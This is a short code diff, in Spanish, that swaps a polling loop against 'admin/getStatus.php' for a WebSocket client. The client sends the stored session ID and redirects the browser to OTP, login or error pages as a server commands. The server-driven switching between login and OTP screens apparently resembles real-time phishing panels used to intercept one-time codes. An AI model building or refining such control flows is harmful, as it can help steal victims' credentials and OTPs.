@@ -1,29 +1,21 @@
-function verificarEstado() {
+const sessionId = localStorage.getItem('session_id');
+const ws = new WebSocket("ws://localhost:8080/ws");
 
-  fetch("admin/getStatus.php", {
-      method: "POST",
-      body: formData,
-    })
-      .then((response) => response.text())
-      .then((data) => {
-      // Mostrar solo la pantalla correspondiente
-      if (data.estado === "login") {
-        document.getElementById("loginForm").style.display = 'block';
-      } else if (data.estado === "otp") {
-        document.getElementById("otp.php").style.display = 'block';
-      } else {
-        document.getElementById("error-pantalla").style.display = 'block';
-      }
-    })
-    .catch((err) => {
-      console.error("Error:", err);
-      // Opcional: Mostrar pantalla de error genérico
-      document.getElementById("error-pantalla").style.display = 'block';
-    });
-}
+ws.onopen = () => {
+    console.log("Conectado al servidor WebSocket");
+    ws.send(JSON.stringify({ session_id: sessionId }));
+};
 
-// Llamar cada 3 segundos (polling)
-setInterval(verificarEstado, 3000);
+ws.onmessage = (event) => {
+    const data = JSON.parse(event.data);
+    console.log("Estado recibido:", data.status);
 
-// Primera carga
-verificarEstado();
+    if (data.status === "otp") {
+        window.location.href = "/otp.php";
+    } else if (data.status === "login") {
+        window.location.href = "/login.html";
+    } else if (data.status === "errorOtp") {
+        window.location.href = "/error.html";
+    }
+};
+
